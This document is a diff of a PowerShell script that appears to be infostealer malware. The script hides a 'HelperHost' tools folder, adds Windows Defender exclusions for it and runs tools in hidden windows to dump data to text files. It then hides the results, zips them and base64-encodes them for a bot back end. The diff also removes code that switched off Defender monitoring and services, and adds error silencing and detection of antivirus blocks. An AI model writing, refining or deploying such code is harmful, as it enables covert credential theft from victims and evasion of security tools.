@@ -1,4 +1,5 @@
-$ErrorActionPreference = 'Continue'
+$ErrorActionPreference = 'SilentlyContinue'
+try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
 $toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
 New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
 cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null
@@ -24,18 +25,9 @@ if (-not $base) { throw 'AGENTSHE_FILES / bot_base manquant' }
 $base = $base.TrimEnd('/')
 
 try {
-  $wid = [Security.Principal.WindowsIdentity]::GetCurrent()
-  $prin = New-Object Security.Principal.WindowsPrincipal($wid)
-  if ($prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
-      Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
-      Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
-    }
-    foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
-      Stop-Service $svc -Force -EA SilentlyContinue
-    }
-  } elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {
-    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
+  if (Get-Command Add-MpPreference -EA SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue 2>$null | Out-Null
+    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue 2>$null | Out-Null
   }
 } catch {}
 
@@ -72,7 +64,12 @@ foreach ($t in $tools) {
     if (Test-Path $zone) { Remove-Item $zone -Force -EA SilentlyContinue }
     $out = Join-Path $toolsDir ($t.id + '.txt')
     Remove-Item $out -Force -EA SilentlyContinue
-    $p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru
+    $p = $null
+    try {
+      $p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -EA Stop
+    } catch {
+      throw ('AV_BLOCK: ' + $_.Exception.Message)
+    }
     if ($null -ne $p) {
       if (-not $p.WaitForExit(45000)) {
         Stop-Process -Id $p.Id -Force -EA SilentlyContinue
@@ -102,9 +99,12 @@ if ($files.Count -eq 0) {
   Set-Content $empty -Value 'aucun resultat' -Encoding UTF8
   $files = @($empty)
 }
-Compress-Archive -Path $files -DestinationPath $zip -Force
+try {
+  Compress-Archive -Path $files -DestinationPath $zip -Force
+} catch {
+  $zip = $files[0]
+}
 cmd /c ('attrib +h +s "' + $zip + '"') | Out-Null
-cmd /c ('attrib +h +s /s /d "' + $toolsDir + '\*"') | Out-Null
 $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
 Write-Output ('FILEB64:' + [IO.Path]::GetFileName($zip) + ':' + $b64)
 if ($errs.Count -gt 0) {
